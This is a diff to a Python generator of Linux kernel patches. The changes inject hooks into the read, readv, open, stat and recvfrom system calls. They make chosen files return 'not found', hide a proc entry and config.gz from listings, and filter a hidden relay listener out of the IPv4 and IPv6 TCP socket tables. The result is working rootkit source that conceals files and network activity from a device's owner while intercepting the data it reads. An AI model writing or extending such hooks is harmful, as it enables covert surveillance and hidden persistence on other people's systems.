@@ -12,6 +12,10 @@ guarded by an exact-count assertion. A wrong/ambiguous anchor makes this script
 FAIL LOUDLY naming the file+anchor — it never emits a mis-placed patch. A patch
 that later fails to `git apply` (context drift vs the builder's exact sublevel)
 is a SAFE, build-time failure, not a bootloop. Re-run after refreshing pristine/.
+
+The generator covers every call-site in patches/, including readv, IPv4/IPv6/Unix
+seq_show filtering, and config.gz open/stat/access/readdir denial. Refresh pristine/
+before running so patch output is deterministic and no hand-maintained feature is lost.
 """
 import os, sys, difflib
 
@@ -99,9 +103,12 @@ PROC_HELPER = [
     " * path, gated to the authorized UID set). Skipped at every traversal point so",
     " * pos accounting stays consistent — it is simply invisible in the listing. */",
     "extern struct proc_dir_entry *lp_proc_entry;",
+    "extern int lp_hide_configgz_current(void);",
     "static inline struct proc_dir_entry *lp_skip_hidden(struct proc_dir_entry *de)",
     "{",
-    "\treturn (de && de == lp_proc_entry) ? pde_subdir_next(de) : de;",
+    "\treturn (de && (de == lp_proc_entry ||",
+    "\t\t(de->name && !strcmp(de->name, \"config.gz\") && lp_hide_configgz_current())))",
+    "\t\t? pde_subdir_next(de) : de;",
     "}",
     "#else",
     "static inline struct proc_dir_entry *lp_skip_hidden(struct proc_dir_entry *de)",
@@ -140,27 +147,37 @@ def port(f, fn):
 def e_read_write(L):
     add_include(L)
     op_span(L, "fs/read_write.c", "ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)",
-            "return ret;", ["\tif (ret > 0)", "\t\tret = lp_read_hook((int)fd, buf, ret);"], "before")
+            "fdput_pos(f);", ["\tif (ret > 0)", "\t\tret = lp_read_hook(f.file, buf, ret, count);"], "before")
     op_span(L, "fs/read_write.c", "ssize_t ksys_pread64(unsigned int fd, char __user *buf, size_t count,",
-            "return ret;", ["\tif (ret > 0)", "\t\tret = lp_read_hook((int)fd, buf, ret);"], "before")
+            "fdput(f);", ["\tif (ret > 0)", "\t\tret = lp_read_hook(f.file, buf, ret, count);"], "before")
+    op_span(L, "fs/read_write.c", "static ssize_t do_readv(unsigned long fd, const struct iovec __user *vec,",
+            "fdput_pos(f);", ["\tif (ret > 0)", "\t\tret = lp_readv_hook(f.file, vec, vlen, ret);"], "before")
+    op_span(L, "fs/read_write.c", "static ssize_t do_preadv(unsigned long fd, const struct iovec __user *vec,",
+            "fdput(f);", ["\tif (ret > 0)", "\t\tret = lp_readv_hook(f.file, vec, vlen, ret);"], "before")
 
 def e_open(L):
     add_include(L)
+    op_global(L, "fs/open.c", "const struct cred *old_cred = NULL;",
+              ["", "\tif (lp_access_deny(filename))", "\t\treturn -ENOENT;"], "after")
     op_global(L, "fs/open.c", "putname(tmp);",
-              ["\tif (fd >= 0)", "\t\tlp_openat_hook(dfd, filename, (int)how->flags, fd);"], "after")
+              ["\tif (fd >= 0) {", "\t\tif (lp_openat_deny(filename)) {",
+               "\t\t\tclose_fd((unsigned int)fd);", "\t\t\tfd = -ENOENT;", "\t\t} else {",
+               "\t\t\tlp_openat_hook(dfd, filename, (int)how->flags, fd);", "\t\t}", "\t}"], "after")
     op_global(L, "fs/open.c", "int retval = close_fd(fd);",
-              ["", "\tlp_close_hook((int)fd);"], "after")
+              ["\tlp_close_hook((int)fd);", ""], "before")
 
 def e_stat(L):
     add_include(L)
     op_span(L, "fs/stat.c", "SYSCALL_DEFINE4(newfstatat, int, dfd", "return cp_new_stat(&stat, statbuf);",
-            ["\terror = cp_new_stat(&stat, statbuf);",
+            ["\tif (lp_stat_deny(filename))", "\t\treturn -ENOENT;",
+             "\terror = cp_new_stat(&stat, statbuf);",
              "\tlp_stat_hook(LP_STAT_NEWFSTATAT, filename, statbuf, error);",
              "\treturn error;"], "replace")
     op_span(L, "fs/stat.c", "SYSCALL_DEFINE2(newfstat, unsigned int, fd", "return error;",
             ["\tlp_stat_hook(LP_STAT_FSTAT, NULL, statbuf, error);"], "before")
     op_span(L, "fs/stat.c", "SYSCALL_DEFINE5(statx,", "return ret;",
-            ["\tlp_stat_hook(LP_STAT_STATX, filename, buffer, ret);"], "before")
+            ["\tif (lp_stat_deny(filename))", "\t\tret = -ENOENT;",
+             "\tlp_stat_hook(LP_STAT_STATX, filename, buffer, ret);"], "before")
 
 def e_statfs(L):
     add_include(L)
@@ -178,6 +195,12 @@ def e_socket(L):
     add_include(L)
     op_span(L, "net/socket.c", "int __sys_recvfrom(", "fput_light(sock->file, fput_needed);",
             ["\tlp_recv_hook(fd, ubuf, size, err, false);"], "after")
+
+def e_tcp_ipv4(L):
+    add_include(L)
+    op_span(L, "net/ipv4/tcp_ipv4.c", "static int tcp4_seq_show(struct seq_file *seq, void *v)",
+            "st = seq->private;",
+            ["\tif (lp_tcp_seq_hidden(sk))", "\t\tgoto out;"], "after")
 
 def e_tcp_ipv6(L):
     # net_hide airtight layer: skip a relay-listener record in tcp6_seq_show BEFORE
@@ -253,6 +276,7 @@ FILES = [
     ("fs/statfs.c", e_statfs),
     ("kernel/sys.c", e_sys),
     ("net/socket.c", e_socket),
+    ("net/ipv4/tcp_ipv4.c", e_tcp_ipv4),
     ("net/ipv6/tcp_ipv6.c", e_tcp_ipv6),
     ("net/unix/af_unix.c", e_af_unix),
     ("drivers/input/input.c", e_input),
